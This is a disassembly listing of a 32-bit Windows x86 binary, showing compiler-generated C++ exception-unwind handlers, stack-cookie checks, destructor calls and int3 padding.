  407c00:	cc                   	int3
  407c01:	cc                   	int3
  407c02:	cc                   	int3
  407c03:	90                   	nop
  407c04:	90                   	nop
  407c05:	8b 54 24 08          	mov    0x8(%esp),%edx
  407c09:	8d 42 0c             	lea    0xc(%edx),%eax
  407c0c:	8b 4a f0             	mov    -0x10(%edx),%ecx
  407c0f:	33 c8                	xor    %eax,%ecx
  407c11:	e8 63 ee ff ff       	call   0x406a79
  407c16:	b8 bc a4 40 00       	mov    $0x40a4bc,%eax
  407c1b:	e9 64 fa ff ff       	jmp    0x407684
  407c20:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  407c23:	e9 08 c7 ff ff       	jmp    0x404330
  407c28:	cc                   	int3
  407c29:	cc                   	int3
  407c2a:	cc                   	int3
  407c2b:	cc                   	int3
  407c2c:	cc                   	int3
  407c2d:	90                   	nop
  407c2e:	90                   	nop
  407c2f:	8b 54 24 08          	mov    0x8(%esp),%edx
  407c33:	8d 42 0c             	lea    0xc(%edx),%eax
  407c36:	8b 8a 68 ff ff ff    	mov    -0x98(%edx),%ecx
  407c3c:	33 c8                	xor    %eax,%ecx
  407c3e:	e8 36 ee ff ff       	call   0x406a79
  407c43:	b8 f8 a4 40 00       	mov    $0x40a4f8,%eax
  407c48:	e9 37 fa ff ff       	jmp    0x407684
  407c4d:	cc                   	int3
  407c4e:	cc                   	int3
  407c4f:	cc                   	int3
  407c50:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  407c53:	e9 d8 c6 ff ff       	jmp    0x404330
  407c58:	cc                   	int3
  407c59:	cc                   	int3
  407c5a:	cc                   	int3
  407c5b:	cc                   	int3
  407c5c:	cc                   	int3
  407c5d:	90                   	nop
  407c5e:	90                   	nop
  407c5f:	8b 54 24 08          	mov    0x8(%esp),%edx
  407c63:	8d 42 0c             	lea    0xc(%edx),%eax
  407c66:	8b 8a 78 ff ff ff    	mov    -0x88(%edx),%ecx
  407c6c:	33 c8                	xor    %eax,%ecx
  407c6e:	e8 06 ee ff ff       	call   0x406a79
  407c73:	b8 24 a5 40 00       	mov    $0x40a524,%eax
  407c78:	e9 07 fa ff ff       	jmp    0x407684
  407c7d:	cc                   	int3
  407c7e:	cc                   	int3
  407c7f:	cc                   	int3
  407c80:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  407c83:	e9 78 a3 ff ff       	jmp    0x402000
  407c88:	cc                   	int3
  407c89:	cc                   	int3
  407c8a:	cc                   	int3
  407c8b:	cc                   	int3
  407c8c:	cc                   	int3
  407c8d:	90                   	nop
  407c8e:	90                   	nop
  407c8f:	8b 54 24 08          	mov    0x8(%esp),%edx
  407c93:	8d 42 0c             	lea    0xc(%edx),%eax
  407c96:	8b 4a c4             	mov    -0x3c(%edx),%ecx
  407c99:	33 c8                	xor    %eax,%ecx
  407c9b:	e8 d9 ed ff ff       	call   0x406a79
  407ca0:	b8 50 a5 40 00       	mov    $0x40a550,%eax
  407ca5:	e9 da f9 ff ff       	jmp    0x407684
  407caa:	cc                   	int3
  407cab:	cc                   	int3
  407cac:	cc                   	int3
  407cad:	cc                   	int3
  407cae:	cc                   	int3
  407caf:	cc                   	int3
  407cb0:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  407cb3:	e9 48 a3 ff ff       	jmp    0x402000
  407cb8:	cc                   	int3
  407cb9:	cc                   	int3
  407cba:	cc                   	int3
  407cbb:	cc                   	int3
  407cbc:	cc                   	int3
  407cbd:	90                   	nop
  407cbe:	90                   	nop
  407cbf:	8b 54 24 08          	mov    0x8(%esp),%edx
  407cc3:	8d 42 0c             	lea    0xc(%edx),%eax
  407cc6:	8b 4a c8             	mov    -0x38(%edx),%ecx
  407cc9:	33 c8                	xor    %eax,%ecx
  407ccb:	e8 a9 ed ff ff       	call   0x406a79
  407cd0:	b8 7c a5 40 00       	mov    $0x40a57c,%eax
  407cd5:	e9 aa f9 ff ff       	jmp    0x407684
  407cda:	cc                   	int3
  407cdb:	cc                   	int3
  407cdc:	cc                   	int3
  407cdd:	cc                   	int3
  407cde:	cc                   	int3
  407cdf:	cc                   	int3
  407ce0:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  407ce3:	e9 f8 b3 ff ff       	jmp    0x4030e0
  407ce8:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  407ceb:	83 c1 38             	add    $0x38,%ecx
  407cee:	e9 8d 9e ff ff       	jmp    0x401b80
  407cf3:	cc                   	int3
  407cf4:	cc                   	int3
  407cf5:	cc                   	int3
  407cf6:	cc                   	int3
  407cf7:	cc                   	int3
  407cf8:	90                   	nop
  407cf9:	90                   	nop
  407cfa:	8b 54 24 08          	mov    0x8(%esp),%edx
  407cfe:	8d 42 0c             	lea    0xc(%edx),%eax
  407d01:	8b 4a e8             	mov    -0x18(%edx),%ecx
  407d04:	33 c8                	xor    %eax,%ecx
  407d06:	e8 6e ed ff ff       	call   0x406a79
  407d0b:	b8 b0 a5 40 00       	mov    $0x40a5b0,%eax
  407d10:	e9 6f f9 ff ff       	jmp    0x407684
  407d15:	cc                   	int3
  407d16:	cc                   	int3
  407d17:	cc                   	int3
  407d18:	cc                   	int3
  407d19:	cc                   	int3
  407d1a:	cc                   	int3
  407d1b:	cc                   	int3
  407d1c:	cc                   	int3
  407d1d:	cc                   	int3
  407d1e:	cc                   	int3
  407d1f:	cc                   	int3
  407d20:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  407d23:	e9 f8 b4 ff ff       	jmp    0x403220
  407d28:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  407d2b:	e9 f0 b4 ff ff       	jmp    0x403220
  407d30:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  407d33:	e9 e8 b4 ff ff       	jmp    0x403220
  407d38:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  407d3b:	e9 c0 a2 ff ff       	jmp    0x402000
  407d40:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  407d43:	e9 e8 c5 ff ff       	jmp    0x404330
  407d48:	68 c0 00 00 00       	push   $0xc0
  407d4d:	8b 45 bc             	mov    -0x44(%ebp),%eax
  407d50:	50                   	push   %eax
  407d51:	e8 66 ed ff ff       	call   0x406abc
  407d56:	83 c4 08             	add    $0x8,%esp
  407d59:	c3                   	ret
  407d5a:	cc                   	int3
  407d5b:	cc                   	int3
  407d5c:	cc                   	int3
  407d5d:	cc                   	int3
  407d5e:	cc                   	int3
  407d5f:	90                   	nop
  407d60:	90                   	nop
  407d61:	8b 54 24 08          	mov    0x8(%esp),%edx
  407d65:	8d 42 0c             	lea    0xc(%edx),%eax
  407d68:	8b 4a 94             	mov    -0x6c(%edx),%ecx
  407d6b:	33 c8                	xor    %eax,%ecx
  407d6d:	e8 07 ed ff ff       	call   0x406a79
  407d72:	8b 4a fc             	mov    -0x4(%edx),%ecx
  407d75:	33 c8                	xor    %eax,%ecx
  407d77:	e8 fd ec ff ff       	call   0x406a79
  407d7c:	b8 fc a5 40 00       	mov    $0x40a5fc,%eax
  407d81:	e9 fe f8 ff ff       	jmp    0x407684
  407d86:	cc                   	int3
  407d87:	cc                   	int3
  407d88:	cc                   	int3
  407d89:	cc                   	int3
  407d8a:	cc                   	int3
  407d8b:	cc                   	int3
  407d8c:	cc                   	int3
  407d8d:	cc                   	int3
  407d8e:	cc                   	int3
  407d8f:	cc                   	int3
  407d90:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  407d93:	e9 68 a2 ff ff       	jmp    0x402000
  407d98:	cc                   	int3
  407d99:	cc                   	int3
  407d9a:	cc                   	int3
  407d9b:	cc                   	int3
  407d9c:	cc                   	int3
  407d9d:	90                   	nop
  407d9e:	90                   	nop
  407d9f:	8b 54 24 08          	mov    0x8(%esp),%edx
  407da3:	8d 42 0c             	lea    0xc(%edx),%eax
  407da6:	8b 4a d8             	mov    -0x28(%edx),%ecx
  407da9:	33 c8                	xor    %eax,%ecx
  407dab:	e8 c9 ec ff ff       	call   0x406a79
  407db0:	b8 50 a6 40 00       	mov    $0x40a650,%eax
  407db5:	e9 ca f8 ff ff       	jmp    0x407684
  407dba:	cc                   	int3
  407dbb:	cc                   	int3
  407dbc:	cc                   	int3
  407dbd:	cc                   	int3
  407dbe:	cc                   	int3
  407dbf:	cc                   	int3
  407dc0:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  407dc3:	e9 68 c5 ff ff       	jmp    0x404330
  407dc8:	cc                   	int3
  407dc9:	cc                   	int3
  407dca:	cc                   	int3
  407dcb:	cc                   	int3
  407dcc:	cc                   	int3
  407dcd:	90                   	nop
  407dce:	90                   	nop
  407dcf:	8b 54 24 08          	mov    0x8(%esp),%edx
  407dd3:	8d 42 0c             	lea    0xc(%edx),%eax
  407dd6:	8b 4a c4             	mov    -0x3c(%edx),%ecx
  407dd9:	33 c8                	xor    %eax,%ecx
  407ddb:	e8 99 ec ff ff       	call   0x406a79
  407de0:	8b 4a fc             	mov    -0x4(%edx),%ecx
  407de3:	33 c8                	xor    %eax,%ecx
  407de5:	e8 8f ec ff ff       	call   0x406a79
  407dea:	b8 7c a6 40 00       	mov    $0x40a67c,%eax
  407def:	e9 90 f8 ff ff       	jmp    0x407684
  407df4:	cc                   	int3
  407df5:	cc                   	int3
  407df6:	cc                   	int3
  407df7:	cc                   	int3
  407df8:	cc                   	int3
  407df9:	cc                   	int3
  407dfa:	cc                   	int3
  407dfb:	cc                   	int3
  407dfc:	cc                   	int3
  407dfd:	cc                   	int3
  407dfe:	cc                   	int3
  407dff:	cc                   	int3
  407e00:	90                   	nop
  407e01:	90                   	nop
  407e02:	8b 54 24 08          	mov    0x8(%esp),%edx
  407e06:	8d 42 0c             	lea    0xc(%edx),%eax
  407e09:	8b 4a f4             	mov    -0xc(%edx),%ecx
  407e0c:	33 c8                	xor    %eax,%ecx
  407e0e:	e8 66 ec ff ff       	call   0x406a79
  407e13:	b8 80 a3 40 00       	mov    $0x40a380,%eax
  407e18:	e9 67 f8 ff ff       	jmp    0x407684
  407e1d:	cc                   	int3
  407e1e:	cc                   	int3
  407e1f:	cc                   	int3
  407e20:	90                   	nop
  407e21:	90                   	nop
  407e22:	8b 54 24 08          	mov    0x8(%esp),%edx
  407e26:	8d 42 0c             	lea    0xc(%edx),%eax
  407e29:	8b 4a f4             	mov    -0xc(%edx),%ecx
  407e2c:	33 c8                	xor    %eax,%ecx
  407e2e:	e8 46 ec ff ff       	call   0x406a79
  407e33:	b8 18 a3 40 00       	mov    $0x40a318,%eax
  407e38:	e9 47 f8 ff ff       	jmp    0x407684
  407e3d:	cc                   	int3
  407e3e:	cc                   	int3
  407e3f:	cc                   	int3
  407e40:	90                   	nop
  407e41:	90                   	nop
  407e42:	8b 54 24 08          	mov    0x8(%esp),%edx
  407e46:	8d 42 0c             	lea    0xc(%edx),%eax
  407e49:	8b 4a f8             	mov    -0x8(%edx),%ecx
  407e4c:	33 c8                	xor    %eax,%ecx
  407e4e:	e8 26 ec ff ff       	call   0x406a79
  407e53:	b8 b0 a6 40 00       	mov    $0x40a6b0,%eax
  407e58:	e9 27 f8 ff ff       	jmp    0x407684
  407e5d:	cc                   	int3
  407e5e:	cc                   	int3
  407e5f:	cc                   	int3
  407e60:	90                   	nop
  407e61:	90                   	nop
  407e62:	8b 54 24 08          	mov    0x8(%esp),%edx
  407e66:	8d 42 0c             	lea    0xc(%edx),%eax
  407e69:	8b 4a fc             	mov    -0x4(%edx),%ecx
  407e6c:	33 c8                	xor    %eax,%ecx
  407e6e:	e8 06 ec ff ff       	call   0x406a79
  407e73:	b8 80 a3 40 00       	mov    $0x40a380,%eax
  407e78:	e9 07 f8 ff ff       	jmp    0x407684
  407e7d:	cc                   	int3
  407e7e:	cc                   	int3
  407e7f:	cc                   	int3
  407e80:	8b 45 e8             	mov    -0x18(%ebp),%eax
  407e83:	83 e0 01             	and    $0x1,%eax
  407e86:	0f 84 0c 00 00 00    	je     0x407e98
  407e8c:	83 65 e8 fe          	andl   $0xfffffffe,-0x18(%ebp)
  407e90:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  407e93:	e9 98 c4 ff ff       	jmp    0x404330
  407e98:	c3                   	ret
  407e99:	cc                   	int3
  407e9a:	cc                   	int3
  407e9b:	cc                   	int3
  407e9c:	cc                   	int3
  407e9d:	cc                   	int3
  407e9e:	90                   	nop
  407e9f:	90                   	nop
  407ea0:	8b 54 24 08          	mov    0x8(%esp),%edx
  407ea4:	8d 42 0c             	lea    0xc(%edx),%eax
  407ea7:	8b 4a d8             	mov    -0x28(%edx),%ecx
  407eaa:	33 c8                	xor    %eax,%ecx
  407eac:	e8 c8 eb ff ff       	call   0x406a79
  407eb1:	8b 4a fc             	mov    -0x4(%edx),%ecx
  407eb4:	33 c8                	xor    %eax,%ecx
  407eb6:	e8 be eb ff ff       	call   0x406a79
  407ebb:	b8 dc a6 40 00       	mov    $0x40a6dc,%eax
  407ec0:	e9 bf f7 ff ff       	jmp    0x407684
  407ec5:	cc                   	int3
  407ec6:	cc                   	int3
  407ec7:	cc                   	int3
  407ec8:	cc                   	int3
  407ec9:	cc                   	int3
  407eca:	cc                   	int3
  407ecb:	cc                   	int3
  407ecc:	cc                   	int3
  407ecd:	cc                   	int3
  407ece:	cc                   	int3
  407ecf:	cc                   	int3
  407ed0:	8d 8d 7c fd ff ff    	lea    -0x284(%ebp),%ecx
  407ed6:	e9 25 a1 ff ff       	jmp    0x402000
  407edb:	8d 8d 94 fd ff ff    	lea    -0x26c(%ebp),%ecx
  407ee1:	e9 9a 9c ff ff       	jmp    0x401b80
  407ee6:	8d 8d 7c fd ff ff    	lea    -0x284(%ebp),%ecx
  407eec:	e9 bf dc ff ff       	jmp    0x405bb0
  407ef1:	6a 50                	push   $0x50
  407ef3:	8b 85 78 fd ff ff    	mov    -0x288(%ebp),%eax
  407ef9:	50                   	push   %eax
  407efa:	e8 bd eb ff ff       	call   0x406abc
  407eff:	83 c4 08             	add    $0x8,%esp
  407f02:	c3                   	ret
  407f03:	cc                   	int3
  407f04:	cc                   	int3
  407f05:	cc                   	int3
  407f06:	cc                   	int3
  407f07:	cc                   	int3
  407f08:	90                   	nop
  407f09:	90                   	nop
  407f0a:	8b 54 24 08          	mov    0x8(%esp),%edx
  407f0e:	8d 42 0c             	lea    0xc(%edx),%eax
  407f11:	8b 8a 70 fd ff ff    	mov    -0x290(%edx),%ecx
  407f17:	33 c8                	xor    %eax,%ecx
  407f19:	e8 5b eb ff ff       	call   0x406a79
  407f1e:	8b 4a fc             	mov    -0x4(%edx),%ecx
  407f21:	33 c8                	xor    %eax,%ecx
  407f23:	e8 51 eb ff ff       	call   0x406a79
  407f28:	b8 10 a7 40 00       	mov    $0x40a710,%eax
  407f2d:	e9 52 f7 ff ff       	jmp    0x407684
  407f32:	cc                   	int3
  407f33:	cc                   	int3
  407f34:	cc                   	int3
  407f35:	cc                   	int3
  407f36:	cc                   	int3
  407f37:	cc                   	int3
  407f38:	cc                   	int3
  407f39:	cc                   	int3
  407f3a:	cc                   	int3
  407f3b:	cc                   	int3
  407f3c:	cc                   	int3
  407f3d:	cc                   	int3
  407f3e:	cc                   	int3
  407f3f:	cc                   	int3
  407f40:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  407f43:	e9 f8 c9 ff ff       	jmp    0x404940
  407f48:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  407f4b:	e9 10 c6 ff ff       	jmp    0x404560
  407f50:	cc                   	int3
  407f51:	cc                   	int3
  407f52:	cc                   	int3
  407f53:	cc                   	int3
  407f54:	cc                   	int3
  407f55:	90                   	nop
  407f56:	90                   	nop
  407f57:	8b 54 24 08          	mov    0x8(%esp),%edx
  407f5b:	8d 42 0c             	lea    0xc(%edx),%eax
  407f5e:	8b 4a d0             	mov    -0x30(%edx),%ecx
  407f61:	33 c8                	xor    %eax,%ecx
  407f63:	e8 11 eb ff ff       	call   0x406a79
  407f68:	b8 54 a7 40 00       	mov    $0x40a754,%eax
  407f6d:	e9 12 f7 ff ff       	jmp    0x407684
  407f72:	cc                   	int3
  407f73:	cc                   	int3
  407f74:	cc                   	int3
  407f75:	cc                   	int3
  407f76:	cc                   	int3
  407f77:	cc                   	int3
  407f78:	cc                   	int3
  407f79:	cc                   	int3
  407f7a:	cc                   	int3
  407f7b:	cc                   	int3
  407f7c:	cc                   	int3
  407f7d:	cc                   	int3
  407f7e:	cc                   	int3
  407f7f:	cc                   	int3
  407f80:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  407f83:	ff 25 0c 91 40 00    	jmp    *0x40910c
  407f89:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  407f8c:	e9 7f dc ff ff       	jmp    0x405c10
  407f91:	cc                   	int3
  407f92:	cc                   	int3
  407f93:	cc                   	int3
  407f94:	cc                   	int3
  407f95:	cc                   	int3
  407f96:	90                   	nop
  407f97:	90                   	nop
  407f98:	8b 54 24 08          	mov    0x8(%esp),%edx
  407f9c:	8d 42 0c             	lea    0xc(%edx),%eax
  407f9f:	8b 4a e0             	mov    -0x20(%edx),%ecx
  407fa2:	33 c8                	xor    %eax,%ecx
  407fa4:	e8 d0 ea ff ff       	call   0x406a79
  407fa9:	8b 4a fc             	mov    -0x4(%edx),%ecx
  407fac:	33 c8                	xor    %eax,%ecx
  407fae:	e8 c6 ea ff ff       	call   0x406a79
  407fb3:	b8 cc a7 40 00       	mov    $0x40a7cc,%eax
  407fb8:	e9 c7 f6 ff ff       	jmp    0x407684
  407fbd:	cc                   	int3
  407fbe:	cc                   	int3
  407fbf:	cc                   	int3
  407fc0:	8b 45 e0             	mov    -0x20(%ebp),%eax
  407fc3:	83 e0 01             	and    $0x1,%eax
  407fc6:	0f 84 10 00 00 00    	je     0x407fdc
  407fcc:	83 65 e0 fe          	andl   $0xfffffffe,-0x20(%ebp)
  407fd0:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  407fd3:	83 c1 78             	add    $0x78,%ecx
  407fd6:	ff 25 78 90 40 00    	jmp    *0x409078
  407fdc:	c3                   	ret
  407fdd:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  407fe0:	83 c1 20             	add    $0x20,%ecx
  407fe3:	ff 25 14 91 40 00    	jmp    *0x409114
  407fe9:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  407fec:	ff 25 68 90 40 00    	jmp    *0x409068
  407ff2:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  407ff5:	83 c1 18             	add    $0x18,%ecx
  407ff8:	e9 73 c2 ff ff       	jmp    0x404270
  407ffd:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  408000:	e9 3b 99 ff ff       	jmp    0x401940
  408005:	cc                   	int3
  408006:	cc                   	int3
  408007:	cc                   	int3
  408008:	cc                   	int3
  408009:	cc                   	int3
  40800a:	90                   	nop
  40800b:	90                   	nop
  40800c:	8b 54 24 08          	mov    0x8(%esp),%edx
  408010:	8d 42 0c             	lea    0xc(%edx),%eax
  408013:	8b 4a d0             	mov    -0x30(%edx),%ecx
  408016:	33 c8                	xor    %eax,%ecx
  408018:	e8 5c ea ff ff       	call   0x406a79
  40801d:	8b 4a fc             	mov    -0x4(%edx),%ecx
  408020:	33 c8                	xor    %eax,%ecx
  408022:	e8 52 ea ff ff       	call   0x406a79
  408027:	b8 00 a8 40 00       	mov    $0x40a800,%eax
  40802c:	e9 53 f6 ff ff       	jmp    0x407684
  408031:	cc                   	int3
  408032:	cc                   	int3
  408033:	cc                   	int3
  408034:	cc                   	int3
  408035:	cc                   	int3
  408036:	cc                   	int3
  408037:	cc                   	int3
  408038:	cc                   	int3
  408039:	cc                   	int3
  40803a:	cc                   	int3
  40803b:	cc                   	int3
  40803c:	cc                   	int3
  40803d:	cc                   	int3
  40803e:	cc                   	int3
  40803f:	cc                   	int3
  408040:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  408043:	83 e0 02             	and    $0x2,%eax
  408046:	0f 84 0c 00 00 00    	je     0x408058
  40804c:	83 65 e4 fd          	andl   $0xfffffffd,-0x1c(%ebp)
  408050:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  408053:	e9 d8 c2 ff ff       	jmp    0x404330
  408058:	c3                   	ret
  408059:	cc                   	int3
  40805a:	cc                   	int3
  40805b:	cc                   	int3
  40805c:	cc                   	int3
  40805d:	cc                   	int3
  40805e:	90                   	nop
  40805f:	90                   	nop
  408060:	8b 54 24 08          	mov    0x8(%esp),%edx
  408064:	8d 42 0c             	lea    0xc(%edx),%eax
  408067:	8b 4a cc             	mov    -0x34(%edx),%ecx
  40806a:	33 c8                	xor    %eax,%ecx
  40806c:	e8 08 ea ff ff       	call   0x406a79
  408071:	b8 4c a8 40 00       	mov    $0x40a84c,%eax
  408076:	e9 09 f6 ff ff       	jmp    0x407684
  40807b:	cc                   	int3
  40807c:	cc                   	int3
  40807d:	cc                   	int3
  40807e:	cc                   	int3
  40807f:	cc                   	int3
  408080:	90                   	nop
  408081:	90                   	nop
  408082:	8b 54 24 08          	mov    0x8(%esp),%edx
  408086:	8d 42 0c             	lea    0xc(%edx),%eax
  408089:	8b 4a e8             	mov    -0x18(%edx),%ecx
  40808c:	33 c8                	xor    %eax,%ecx
  40808e:	e8 e6 e9 ff ff       	call   0x406a79
  408093:	8b 4a fc             	mov    -0x4(%edx),%ecx
  408096:	33 c8                	xor    %eax,%ecx
  408098:	e8 dc e9 ff ff       	call   0x406a79
  40809d:	b8 18 a3 40 00       	mov    $0x40a318,%eax
  4080a2:	e9 dd f5 ff ff       	jmp    0x407684
  4080a7:	cc                   	int3
  4080a8:	cc                   	int3
  4080a9:	cc                   	int3
  4080aa:	cc                   	int3
  4080ab:	cc                   	int3
  4080ac:	cc                   	int3
  4080ad:	cc                   	int3
  4080ae:	cc                   	int3
  4080af:	cc                   	int3
  4080b0:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4080b3:	e9 88 c8 ff ff       	jmp    0x404940
  4080b8:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4080bb:	e9 a0 c4 ff ff       	jmp    0x404560
  4080c0:	cc                   	int3
  4080c1:	cc                   	int3
  4080c2:	cc                   	int3
  4080c3:	cc                   	int3
  4080c4:	cc                   	int3
  4080c5:	90                   	nop
  4080c6:	90                   	nop
  4080c7:	8b 54 24 08          	mov    0x8(%esp),%edx
  4080cb:	8d 42 0c             	lea    0xc(%edx),%eax
  4080ce:	8b 4a cc             	mov    -0x34(%edx),%ecx
  4080d1:	33 c8                	xor    %eax,%ecx
  4080d3:	e8 a1 e9 ff ff       	call   0x406a79
  4080d8:	b8 80 a8 40 00       	mov    $0x40a880,%eax
  4080dd:	e9 a2 f5 ff ff       	jmp    0x407684
  4080e2:	cc                   	int3
  4080e3:	cc                   	int3
  4080e4:	cc                   	int3
  4080e5:	cc                   	int3
  4080e6:	cc                   	int3
  4080e7:	cc                   	int3
  4080e8:	cc                   	int3
  4080e9:	cc                   	int3
  4080ea:	cc                   	int3
  4080eb:	cc                   	int3
  4080ec:	cc                   	int3
  4080ed:	cc                   	int3
  4080ee:	cc                   	int3
  4080ef:	cc                   	int3
  4080f0:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4080f3:	83 e0 02             	and    $0x2,%eax
  4080f6:	0f 84 0c 00 00 00    	je     0x408108
  4080fc:	83 65 e4 fd          	andl   $0xfffffffd,-0x1c(%ebp)
  408100:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  408103:	e9 f8 9e ff ff       	jmp    0x402000
  408108:	c3                   	ret
  408109:	cc                   	int3
  40810a:	cc                   	int3
  40810b:	cc                   	int3
  40810c:	cc                   	int3
  40810d:	cc                   	int3
  40810e:	90                   	nop
  40810f:	90                   	nop
  408110:	8b 54 24 08          	mov    0x8(%esp),%edx
  408114:	8d 42 0c             	lea    0xc(%edx),%eax
  408117:	8b 4a c8             	mov    -0x38(%edx),%ecx
  40811a:	33 c8                	xor    %eax,%ecx
  40811c:	e8 58 e9 ff ff       	call   0x406a79
  408121:	b8 f8 a8 40 00       	mov    $0x40a8f8,%eax
  408126:	e9 59 f5 ff ff       	jmp    0x407684
  40812b:	b9 1c c4 40 00       	mov    $0x40c41c,%ecx
  408130:	e9 eb e8 ff ff       	jmp    0x406a20
